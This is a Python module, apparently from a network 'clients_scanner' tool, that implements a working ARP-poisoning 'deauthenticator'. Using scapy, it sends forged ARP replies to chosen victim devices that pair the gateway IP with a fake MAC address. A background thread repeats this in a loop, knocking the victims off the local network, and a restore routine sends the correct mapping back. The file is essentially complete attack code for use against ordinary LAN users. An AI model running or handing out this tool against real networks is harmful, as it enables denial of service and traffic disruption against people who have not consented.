"""deauth module for clients_scanner"""
import queue
import time
from threading import Thread

from scapy.all import ARP, Ether, send
from termcolor import colored

# my modules
from clients_scanner.logger import log


class Deauthenticator:
    """deauthenticator class; based on: https://github.com/roglew/wifikill
    gateway_ip - you can pass it to constructor or set as attribute to object
    if gateway_ip is None `run` raises TypeError

    dictionary format:
        {
            victim_mac: {
                "victim_ip": victim_ip,
                "deauth_flag": False,  # restore in first possible iteration
            },
            victim_mac: {
                "victim_ip": victim_ip,
                "deauth_flag": True,  # deauth (poison) in loop
            },
        }
    """
    def __init__(self, debug=False, gateway_ip=None, gateway_mac=None, log=log):
        self.debug = debug
        self.color = "yellow"
        if log is None:
            self.log = lambda text, color: print(colored(text, color))
        else:
            self.log = log
        self.log("[*] deauthenticator", self.color)
        self.hold_thread = False
        self.join_thread_flag = False
        self.deauth_thread = None

        # data
        self.deauth_wait_between_packets = 0.1
        self.fake_mac = "aa:bb:cc:dd:ee:ff"  # for now; use random macs
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.clients_deauth_dict = {}
        self.deauth_queue = queue.Queue()

    def run(self):
        """run deauthentication thread"""
        if self.gateway_ip is None:
            raise Exception('gateway_ip is None')
        if self.gateway_mac is None:
            raise Exception('gateway_mac is None')
        self.deauth_thread = Thread(target=self._deauth_loop)
        self.deauth_thread.start()

    def set_gateway_ip_mac(self, gateway_ip, gateway_mac):
        """set new gateway IP and mac"""
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac
        self.log(
                "[*] gateway IP/mac set to: {}/{}".format(
                    self.gateway_ip, self.gateway_mac
                ),
                self.color,
            )
        return None

    def join_thread(self):
        """join thread from external object"""
        self.join_thread_flag = True
        self.deauth_thread.join()
        self.log('[*] deauthenticator thread joined', self.color)
        return None

    def _deauth_loop(self):
        """deauth clients specified in clients_deauth_dict"""
        while True:
            if self.hold_thread:
                if self.join_thread_flag:
                    return False
                time.sleep(0.01)
                continue

            if self.join_thread_flag:
                return False

            while True:
                if self.deauth_queue.empty():
                    # self.log('no devices in queue')
                    break
                (victim_mac, victim_ip, status) = self.deauth_queue.get()
                self.log('[*] took from queue: {}'.format((victim_mac, victim_ip, status)), self.color)
                self.clients_deauth_dict[victim_mac] = {
                    "victim_ip": victim_ip,
                    "deauth_flag": status,
                }

            if not self.clients_deauth_dict:
                time.sleep(0.05)
                continue

            # copy, to prevent changes in dict, while iterating
            clients_dict_copy = self.clients_deauth_dict.copy()

            for (victim_mac, info) in clients_dict_copy.items():
                victim_ip = info["victim_ip"]
                deauth_flag = info["deauth_flag"]

                if deauth_flag:
                    if not self.debug:
                        self._poison(
                            victim_ip, victim_mac, self.gateway_ip, self.fake_mac
                        )
                    self.log("[*] poisoning victim: ({}, {})".format(victim_mac, victim_ip), self.color)
                else:
                    if not self.debug:
                        self._restore(victim_ip, victim_mac, self.gateway_ip, self.gateway_mac)
                    self.log("[*] restoring victim: ({}, {})".format(victim_mac, victim_ip), self.color)

                    # remove client from dictionary, to not send restore every time
                    self.clients_deauth_dict.pop(victim_mac)

            time.sleep(self.deauth_wait_between_packets)
        return None

    def _poison(self, victim_ip, victim_mac, gateway_ip, fake_mac):
        """Send the victim an ARP packet pairing the gateway ip with the wrong mac address"""
        try:
            packet = ARP(
                op=2,
                psrc=gateway_ip,
                hwsrc=fake_mac,
                pdst=victim_ip,
                hwdst=victim_mac,
            )
            send(packet, verbose=0)
        except OSError as err:
            self.log("error catched: {}".format(err), self.color)
        return None

    def _restore(self, victim_ip, victim_mac, gateway_ip, gateway_mac):
        """Send the victim an ARP packet pairing the gateway ip with the correct mac address"""
        try:
            packet = ARP(
                op=2,
                psrc=gateway_ip,
                hwsrc=gateway_mac,
                pdst=victim_ip,
                hwdst=victim_mac,
            )
            send(packet, verbose=0)
        except OSError as err:
            self.log("error catched: {}".format(err), self.color)
        return None


if __name__ == "__main__":
    print('import it as module rather than call')
    mac = 'AA:CC:DD:AA:CC:DD'
    deauth = Deauthenticator(gateway_ip='192.168.0.1', gateway_mac=mac)
    deauth.run()
    